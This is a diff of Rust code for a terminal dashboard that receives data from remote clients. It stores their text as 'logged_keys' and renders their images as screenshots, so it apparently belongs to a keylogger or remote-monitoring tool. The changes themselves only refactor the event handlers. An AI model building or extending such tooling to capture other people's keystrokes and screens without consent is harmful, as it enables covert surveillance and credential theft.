@@ -22,7 +22,7 @@ use ratatui_image::{
     picker::Picker,
 };
 
-use image::ImageReader;
+use image::{DynamicImage, ImageReader};
 use color_eyre::Result;
 use futures::{FutureExt, StreamExt};
 
@@ -30,11 +30,12 @@ use crate::server::ClientEvent;
 
 fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
     app.screenshot
+        .protocol
         .update_resized_protocol(request.resize_encode()?);
     Ok(())
 }
 
-fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
+fn handle_client_txt_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
     match event {
         ClientEvent::Connected(addr) => app.addr = addr.to_string(),
         ClientEvent::Data(bytes) => app.logged_keys.push_str(std::str::from_utf8(&bytes)?),
@@ -46,21 +47,11 @@ fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn 
 async fn handle_client_img_event(app: &'_ mut App<'_>, event: ClientEvent) -> Result<(), Box<dyn Error>> {
     match event {
         ClientEvent::Connected(addr) => app.img_addr = addr.to_string(),
-        ClientEvent::Data(bytes) => { 
-            let image = tokio::task::spawn_blocking(move || {
-                ImageReader::new(
-                    Cursor::new(bytes)
-                )
-                .with_guessed_format()?
-                .decode()
-            }).await??;
-
-            let protocol = Picker::from_query_stdio()?
-                .new_resize_protocol(image);
-
-            let tx_clone = app.tx.clone();
-            app.screenshot = ThreadProtocol::new(tx_clone, Some(protocol))
-        }  
+        ClientEvent::Data(bytes) => {
+            app.screenshot.bytes.clear();
+            app.screenshot.bytes.extend_from_slice(&bytes);
+            app.screenshot.apply_changes().await?;
+        },
         ClientEvent::Disconnected => app.img_addr = String::new(),
     }
     Ok(())
@@ -123,8 +114,8 @@ where
         terminal.draw(|frame| ui::render(frame, &mut app))?;
 
         tokio::select! {
-            Some(request) = app.rx.recv() => handle_request(&mut app, request)?,
-            Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
+            Some(request) = app.screenshot.rx.recv() => handle_request(&mut app, request)?,
+            Some(client_event) = app.client.app_receiver.recv() => handle_client_txt_event(&mut app, client_event)?,
             Some(client_img_event) = app.client.app_img_receiver.recv() => handle_client_img_event(&mut app, client_img_event).await?,
             Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
         }
